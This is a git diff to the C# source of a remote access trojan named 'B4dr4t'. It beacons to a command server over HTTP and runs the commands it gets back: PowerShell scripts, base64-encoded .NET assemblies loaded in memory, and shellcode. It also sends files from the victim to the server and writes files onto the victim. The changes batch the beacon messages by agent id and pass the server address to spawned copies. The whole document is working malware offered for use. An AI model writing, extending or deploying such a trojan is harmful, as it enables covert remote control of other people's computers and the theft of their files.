@@ -11,6 +11,7 @@ using Newtonsoft.Json.Linq;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Runtime.InteropServices;
+using System.Collections.Generic;
 
 
 // Make sure to include the Powershell DLL file as a reference before compiling this project.
@@ -164,6 +165,11 @@ namespace B4dr4t
         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
         int dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        public static class Globl
+        {
+            public static string[] HOME = new string[1];
+        }
+
         // By passing in the same Powershell object we share the same Powershell workspace as standard cmd execution
         private static string RunPs(string encodedScript, PowerShell ps)
         {
@@ -177,20 +183,27 @@ namespace B4dr4t
             return results;
         }
 
-        // Runs the current assembly Main() in new app domain and has no parameters so it can be easily called via threads
+        // Runs the current assembly Spawn) in new app domain and has no parameters so it can be easily called via threads
         private static void Spawn()
         {
             Assembly assembly = Assembly.GetEntryAssembly();
             AppDomain appDomain = AppDomain.CreateDomain(id);
             appDomain.Load(assembly.FullName);
-            appDomain.ExecuteAssemblyByName(assembly.FullName);
+            appDomain.ExecuteAssemblyByName(assembly.FullName, Globl.HOME);
         }
         //Most of this function is copied from C Sharper: https://gitlab.com/KevinJClark/csharper
         private static string RunAssembly(string encodedAssembly, string argumentString)
         {
+            
             string Delimeter = "\",\""; // split on quote comma quote ( "," )
             argumentString = argumentString.Trim('"'); //Remove leading and trailing quotes
             string[] assemblyArgs = argumentString.Split(new[] { Delimeter }, StringSplitOptions.None);
+
+
+            if (argumentString == "  ")
+            {
+                assemblyArgs = null;
+            }
             bool foundMain = false;
             bool execMain = false;
             Assembly assembly = null;
@@ -231,11 +244,19 @@ namespace B4dr4t
 
                             object instance = Activator.CreateInstance(type);
                             // https://stackoverflow.com/questions/3721782/parameter-count-mismatch-with-invoke
-                            var output = method.Invoke(instance, new object[] { assemblyArgs }); // Runs the main function with args
+                            if(argumentString == "  ")
+                            {
+                                string[] empty = new string[0];
+                                method.Invoke(instance, new object[] { empty }); // Runs the main function without args
+                            }
+                            else
+                            {
+                                method.Invoke(instance, new object[] { assemblyArgs }); // Runs the main function with args
+                            }
 
                             //Restore output -- Stops redirecting output
                             Console.SetOut(prevConOut);
-                            output = sw.ToString();
+                            var output = sw.ToString();
 
                             return (string)output;
                         }
@@ -301,156 +322,168 @@ namespace B4dr4t
             {
                 home = args[0];
             }
+            Globl.HOME[0] = home;
+
+
 
             HttpClient client = new HttpClient();
+
             PowerShell ps = PowerShell.Create();
+
             Collection<PSObject> output = null;
+
             JObject jsObject = new JObject();
 
             while (true)
             {
-                try
-                {
-                    string resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"}";
+               try
+               {
+                    string resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
                     HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;
 
                     string serverMsg = postResults.Content.ReadAsStringAsync().Result;
-                    string jString = "{" + serverMsg.Split('{')[1].Split('\n')[0];
+                    string jString = "{" + string.Join("{", serverMsg.Split('{').Skip(1).ToArray()).Split('\n')[0];
+
                     jsObject = JObject.Parse(jString);
-
-                    // If cmnd is not empty string ("")
-                    if (jsObject["cmnd"].ToString() != "")
+                    var test = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, List<Dictionary<string,string>>>>(jString);
+                    foreach (var package in jsObject["p"])
                     {
-                        cmnd = jsObject["cmnd"].ToString();
-                        rettype = "retval";
+                        if (package["id"].ToString() == id)
+                        {
 
-                        if (cmnd == "quit")
-                        {
-                            return;
-                        }
-                        else if (cmnd == "spawn")
-                        {
-                            //Executes the Spawn function in a new thread (not process)
-                            try
-                            {
-                                ThreadStart x = new ThreadStart(Spawn);
-                                Thread t = new Thread(x);
-                                t.Start();
-                                retval = "[+] Spawn success...";
-                            }
-                            catch
-                            {
-                                retval = "[-] Spawn failed...";
-                            }
-
-                        }
-                        else if (cmnd.Split(' ')[0] == "psh")
-                        {
-                            //Run encoded powershell sent from the server
-                            string encodedScript = cmnd.Split(' ')[1];
-                            retval = RunPs(encodedScript, ps);
-                        }
-                        else if (cmnd.Split(' ')[0] == "cs")
-                        {
-                            //Run a C Sharp executable (aka assembly)
-                            //cs <base64_encoded_assembly> "arg1","arg2","third arg"
-                            string b64Assembly = cmnd.Split(' ')[1];
-                            //Cuts off the first two elements of cmnd (cs and <b64assembly>) and returns a string array
-                            string argumentString = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray()); //Equiv to args = " ".join(cmnd.split(" ")[2:])
-                            retval = RunAssembly(b64Assembly, argumentString);
-
-                        }
-                        else if (cmnd.Split(' ')[0] == "shc")
-                        {
-                            try
-                            {
-                                string code = cmnd.Split(' ')[1];
-                                retval = RunShc(code);
-                            }
-                            catch(Exception e)
-                            {
-                                retval = "[!] Error occured running sh#llc#de: \n" + e;
-                            }
-                        }
-                        else if (cmnd.Split(' ')[0] == "dl")
-                        {
-                            //Download a file -- Send a file from the rat to the server
-                            string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
-                            filename = Path.GetFullPath(filename);
-                            try
-                            {
-                                retdata = File.ReadAllBytes(filename);
-                                rettype = "dl";
-                            }
-                            catch
+                            cmnd = package["cmnd"].ToString();
+                            if (cmnd != "") // If cmnd is not empty string ("")
                             {
                                 rettype = "retval";
-                                retval = "[-] Could not read file " + filename;
-                            }
-                        }
-                        else if (cmnd.Split(' ')[0] == "up")
-                        {
-                            //Upload a file -- Send a file from the server to the rat
-                            string filename = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray());
-                            filename = Path.GetFullPath(filename);
-                            try
-                            {
-                                byte[] content = Convert.FromBase64String(cmnd.Split(' ')[1]);
 
-                                File.WriteAllBytes(filename, content);
-                                retval = "[+] File uploaded: " + filename;
-                            }
-                            catch
-                            {
-                                retval = "[-] Could not write file " + filename;
-                            }
-                        }
-                        else // Execute (Power)shell command
-                        {
-                            if(cmnd.StartsWith("cd "))
-                            {
-                                // Change directories in C# when we CD in shell to keep C# and PS pwd the same
-                                try
+                                if (cmnd == "quit")
                                 {
-                                    var directory = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
-                                    Directory.SetCurrentDirectory(directory);
+                                    return;
                                 }
-                                catch
+                                else if (cmnd == "spawn")
                                 {
-                                    //pass
-                                }
-                            }
-                            output = ps.AddScript(cmnd).Invoke();
-                            foreach (PSObject item in output)
-                            {
-                                retval += item.ToString() + "\n";
-                            }
-                        }
+                                    //Executes the Spawn function in a new thread (not process)
+                                    try
+                                    {
+                                        ThreadStart x = new ThreadStart(Spawn);
+                                        Thread t = new Thread(x);
+                                        t.Start();
+                                        retval = "[+] Spawn success...";
+                                    }
+                                    catch
+                                    {
+                                        retval = "[-] Spawn failed...";
+                                    }
 
-                        // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
-                        if (rettype == "dl")
-                        {
-                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"}";
-                        }
-                        else
-                        {
-                            if (retval == "")
-                            {
-                                retval = "[*] No output returned";
+                                }
+                                else if (cmnd.Split(' ')[0] == "psh")
+                                {
+                                    //Run encoded powershell sent from the server
+                                    string encodedScript = cmnd.Split(' ')[1];
+                                    retval = RunPs(encodedScript, ps);
+                                }
+                                else if (cmnd.Split(' ')[0] == "cs")
+                                {
+                                    //Run a C Sharp executable (aka assembly)
+                                    //cs <base64_encoded_assembly> "arg1","arg2","third arg"
+                                    string b64Assembly = cmnd.Split(' ')[1];
+                                    //Cuts off the first two elements of cmnd (cs and <b64assembly>) and returns a string array
+                                    string argumentString = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray()); //Equiv to args = " ".join(cmnd.split(" ")[2:])
+                                    retval = RunAssembly(b64Assembly, argumentString);
+
+                                }
+                                else if (cmnd.Split(' ')[0] == "shc")
+                                {
+                                    try
+                                    {
+                                        string code = cmnd.Split(' ')[1];
+                                        retval = RunShc(code);
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        retval = "[!] Error occured running sh#llc#de: \n" + e;
+                                    }
+                                }
+                                else if (cmnd.Split(' ')[0] == "dl")
+                                {
+                                    //Download a file -- Send a file from the rat to the server
+                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
+                                    filename = Path.GetFullPath(filename);
+                                    try
+                                    {
+                                        retdata = File.ReadAllBytes(filename);
+                                        rettype = "dl";
+                                    }
+                                    catch
+                                    {
+                                        rettype = "retval";
+                                        retval = "[-] Could not read file " + filename;
+                                    }
+                                }
+                                else if (cmnd.Split(' ')[0] == "up")
+                                {
+                                    //Upload a file -- Send a file from the server to the rat
+                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray());
+                                    filename = Path.GetFullPath(filename);
+                                    try
+                                    {
+                                        byte[] content = Convert.FromBase64String(cmnd.Split(' ')[1]);
+
+                                        File.WriteAllBytes(filename, content);
+                                        retval = "[+] File uploaded: " + filename;
+                                    }
+                                    catch
+                                    {
+                                        retval = "[-] Could not write file " + filename;
+                                    }
+                                }
+                                else // Execute (Power)shell command
+                                {
+                                    if (cmnd.StartsWith("cd "))
+                                    {
+                                        // Change directories in C# when we CD in shell to keep C# and PS pwd the same
+                                        try
+                                        {
+                                            var directory = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
+                                            Directory.SetCurrentDirectory(directory);
+                                        }
+                                        catch
+                                        {
+                                            //pass
+                                        }
+                                    }
+                                    output = ps.AddScript(cmnd).Invoke();
+                                    foreach (PSObject item in output)
+                                    {
+                                        retval += item.ToString() + "\n";
+                                    }
+                                }
+
+                                // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
+                                if (rettype == "dl")
+                                {
+                                    resp = "{\"p\":[ { \"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"} ] }";
+                                }
+                                else
+                                {
+                                    if (retval == "")
+                                    {
+                                        retval = "[*] No output returned";
+                                    }
+                                    resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"} ] }";
+                                }
+                                retval = string.Empty;
+                                postResults = client.PostAsync(home, new StringContent(resp)).Result;
                             }
-                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"}";
                         }
-                        retval = string.Empty;
-                        postResults = client.PostAsync(home, new StringContent(resp)).Result;
                     }
                     Thread.Sleep(sleepytime);
-                }
-                catch
-                {
+               }
+               catch
+               {
                     Thread.Sleep(sleepytime);
-                }
+               }
             }
         }
     }
 }
-
